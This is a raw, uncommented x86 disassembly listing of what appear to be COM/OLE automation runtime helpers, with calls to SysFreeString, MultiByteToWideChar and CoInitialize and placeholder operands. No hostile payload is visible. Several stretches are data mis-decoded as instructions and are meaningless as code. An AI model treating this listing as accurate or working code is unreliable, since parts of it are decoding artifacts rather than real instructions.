call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov edx edi
mov eax [ esi ]
call sub_406448
cmp [ ebp - 0x2c ] 0x7
jg r-xdata
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x34 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x30 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax + 0x8 ]
call sub_40646c
mov edx [ ebp - 0x40 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x40 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov ecx 0x8
call sub_411d34
add [ ebp - 0x34 ] 0x4
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0xc ] eax
sub_42c76c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
pop ecx
pop ecx
pop ebp
retn
sub_42c7a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_40a868
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_42bd80
push ebp
call sub_42c76c
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42c898
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
movzx edx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_42c880
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
movzx ecx [ ebx + 0x2 ]
inc ecx
movzx eax [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_42c7a0
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42c430
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_41163c
sub_42c934
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_42c9f9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bbf8
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_4057d4
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_4057d4
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_4057d4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bccc
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca00
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_405554
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_404ec4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4061e4
jmp r-xdata
sub_42ca24
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_42ca14
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_42c934
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_42cb08
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_42ca24
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_42cb39 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_41163c
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_42cbe4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
test eax 0x80000000
sete al
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
test eax 0x80000000
sete al
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_42cc60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ccd6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ccdd
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_404650
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_4060f8
call CoUninitialize
sub_42cce0
sub al 0xcd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
int 0x42
add [ eax ] cl
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + ecx * 8 ] al
inc edx
add [ eax + 0x48004034 ] al
into
inc edx
add [ esi + ecx * 8 ] dh
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0x9400408d
int 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80042cd ] ah
add [ eax ] al
add al ah
int3
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42cdc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42ce04
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42ce48
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41978c
mov eax esi
pop esi
pop ebx
retn
sub_42cf14
sbb bh cl
inc edx
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
xor al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
add [ edi ] cl
or eax 0x6c654849
dec ecx
add [ ebx + 0x1825ffc0 ] cl
in eax 0x49
add [ ebx + 0x1425ffc0 ] cl
in eax 0x49
add [ ebx + 0x1025ffc0 ] cl
in eax 0x49
add [ ebx + 0xc25ffc0 ] cl
in eax 0x49
add [ ebx + 0x825ffc0 ] cl
in eax 0x49
add [ ebx + 0x42cf18c0 ] cl
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
outsb
dec eax
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
or eax 0xc0830000
fsubr st1
jmp 0xffffffff8342d0d9
je r-xdata
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
jns r-xdata
imul esp [ ebp + 0x77 ] 0xcf807265
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
inc [ edi + ecx * 8 + 0x110f0042 ]
dec ecx
inc ebx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11347265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
rcr al 0xe9
int 0xc
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
insd
inc ebp
js r-xdata
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
inc ebp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 8 + 0x42 ] al
je r-xdata
jns r-xdata
add [ eax ] al
outsb
je r-xdata
dec [ ebx + 0x42cf50c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_407080
xor eax eax
push ebp
push sub_42dea9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42deb0
jmp r-xdata
jo r-xdata
lea eax [ eax ]
int3
jae r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
add [ eax + eax ] cl
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_42de47
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ ebx - 0x27fbdbbc ] al
jmp sub_4070b8
imul ebp [ edi + 0x6e ] 0xcc00408d
add eax 0xffffffdc
jmp r-xdata
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
rol [ edx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
rol [ edx ] 0x1
or al 0x0
add bh bh
inc [ eax + edx * 8 + 0x42 ]
insd
xor al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42cfc0c0 ]
add [ edi ] cl
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0x20 ]
mov edx ebx
call sub_405584
mov eax [ eax + 0x1c ]
retn
jo r-xdata
cmp cl [ ecx ]
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42de4e
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_419898
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_407024
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_407050
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42d310
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
call sub_42d2e4
mov eax ebx
mov edx [ rw-data ]
mov ecx r-xdata
call sub_407050
cmp [ ebx ] 0x0
setne al
pop ebx
pop ebp
retn
xor eax eax
mov [ ebx ] eax
sub_42d350
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_404620
lea eax [ edi + 0x4 ]
mov edx esi
call sub_407024
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42d394
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x20 ]
call sub_405530
mov [ esi + 0x18 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42d3f8
push ebx
push esi
push edi
push ebp
call sub_404a1c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc edi
mov eax [ ebp + 0x14 ]
call sub_404650
mov eax [ ebp + 0x10 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_404640
test bl bl
jle r-xdata
lea eax [ ebp + 0xc ]
call sub_40700c
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_419898
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax esi
call sub_404650
dec edi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4049c4
sub_42d470
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d510
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d350
mov esi eax
mov eax [ ebx + 0x18 ]
mov [ esi + 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_419740
mov edx [ ebx + 0x18 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x4 ]
call sub_40700c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40f954
test al al
je r-xdata
inc [ ebx + 0x18 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
test edx edx
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_419740
mov ecx r-xdata
call sub_407050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d517
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub edx 0xfffffff8
sub_42d540
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_419898
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42d570
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42d6c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42d67a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jne r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d681
mov eax [ ebp - 0xc ]
call sub_404650
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_419898
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_407024
sub_42d681
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d6cc
lea eax [ ebp - 0x14 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_42d6d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42d778
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
lea eax [ edi + 0x20 ]
mov edx [ ebp - 0xc ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d77f
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp - 0xd ] al
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edx esi
call sub_419898
mov eax [ eax + 0x4 ]
push eax
lea eax [ ebp - 0x4 ]
call sub_40700c
mov ecx eax
mov edx sub_42d78c
pop eax
call sub_40f954
test al al
je r-xdata
sub_42d78c
and al 0x22
jpo r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42da33
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
scasb [ edi ]
push ds
adc eax [ ebx - 0x46 ]
salc
cmp al 0x32
clc
div [ eax - 0x7b ]
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da3a
lea eax [ ebp - 0x30 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x20 ] eax
xor edx edx
push ebp
push sub_42da0e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
dec eax
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4059dc
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x20 ]
call sub_419740
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42d9f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_419898
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
